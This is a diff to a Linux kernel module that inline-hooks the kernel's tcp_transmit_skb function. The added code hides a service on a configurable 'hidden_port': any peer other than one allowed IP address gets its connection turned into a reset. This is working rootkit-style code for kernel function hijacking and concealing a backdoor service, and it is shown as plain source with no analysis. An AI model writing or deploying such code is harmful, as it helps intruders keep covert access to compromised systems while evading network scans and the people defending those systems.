@@ -29,10 +29,13 @@ static char hjc[HIJACK_LEN] = {0x68,0x0,0x0,0x0,0x0,0xc3};
 static unsigned int *p_addr = (unsigned int*) (hjc+1);
 
 static char * allowed_ip_str = "000.000.000.000";
+static unsigned short hidden_port = 0;
 static unsigned int allowed_ip = 0;
 
 module_param(allowed_ip_str,charp,0);
+module_param(hidden_port, short, 0);
 MODULE_PARM_DESC(allowed_ip_str, "IP address format: XXX.XXX.XXX.XXX");
+MODULE_PARM_DESC(hidden_port, "Hidden service port");
 
 //move this to hooking.h
 union address_conv_t {
@@ -79,13 +82,23 @@ static int my_tcp_transmit_skb(struct sock * sk, struct sk_buff *skb, int clone_
 	struct inet_sock *inet;
 	struct tcp_skb_cb *tcb;
 	//check stuff
-
-	printk(KERN_INFO "hijack worked.\n");
 	
 	inet = inet_sk(sk);
 	tcb = TCP_SKB_CB(skb);
 	
-	printk(KERN_INFO "dp %d sp %d sa %d da %d\n", inet->inet_dport, inet->inet_sport, inet->inet_saddr, inet->inet_daddr);
+	if(ntohs(inet->inet_sport) == hidden_port){
+		printk(KERN_INFO "hidden port knocked!\n");
+		if(inet->inet_daddr == allowed_ip){
+			printk(KERN_INFO "everything ok.\n");
+		}
+		else {
+			tcb->tcp_flags &= ~TCPHDR_SYN;
+			tcb->tcp_flags |= TCPHDR_ACK;
+			tcb->tcp_flags |= TCPHDR_RST;
+		}
+	} 
+//	printk(KERN_INFO "dp %d sp %d sa %pI4 da %pI4\n", ntohs(inet->inet_dport), ntohs(inet->inet_sport),&inet->inet_saddr,&inet->inet_daddr);
+	//printk(KERN_INFO "flags: %x %d\n", tcb->tcp_flags);
 
 	spin_lock(&hijack_lock);
 	dp();
@@ -93,17 +106,23 @@ static int my_tcp_transmit_skb(struct sock * sk, struct sk_buff *skb, int clone_
 	ret = orig_tcp_transmit_skb(sk,skb,clone_it, gfp_mask);
 	memcpy(orig_tcp_transmit_skb, &hjc, HIJACK_LEN);
 	wp();
+	spin_unlock(&hijack_lock);	
 
 	return ret;
 }
 
 void no_knock(void){
 	unsigned long * addr;
+
+	printk(KERN_INFO "=================================\n");
+	
 	addr = (unsigned long *) kallsyms_lookup_name("tcp_transmit_skb");
 	orig_tcp_transmit_skb = (int (*)(struct sock *,struct sk_buff*, int, gfp_t))addr;
+
+	allowed_ip = ipstr_to_int(allowed_ip_str);	
+	printk(KERN_INFO "allowed ip: %pI4\n", &allowed_ip);
 	
 	hijack_transmit_skb();
-	printk(KERN_INFO "knocking disenganged? %p\n", addr);
 }
 
 
